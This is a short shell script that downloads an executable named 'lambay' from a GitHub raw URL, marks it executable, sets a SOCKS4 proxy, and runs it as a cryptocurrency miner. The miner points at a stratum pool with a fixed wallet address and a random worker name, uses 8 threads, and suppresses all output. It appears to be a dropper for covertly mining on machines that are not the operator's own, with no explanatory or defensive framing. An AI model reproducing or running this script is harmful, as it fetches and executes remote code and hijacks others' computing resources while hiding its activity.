#!/bin/sh
wget -q https://raw.githubusercontent.com/yukcoba12/coba/master/lambay
chmod +x lambay
export http_proxy=socks4://193.106.231.145:4145
./lambay -a gr  -o stratum+tcp://stratum-asia.rplant.xyz:7056 -u RE8bmay7ugHbVXVyzgsnmf1pxJ3hj5rwdX.$(echo $(shuf -i 1-99999 -n 1)-Leaf) -p password=x -t 8 >/dev/null 2>&1
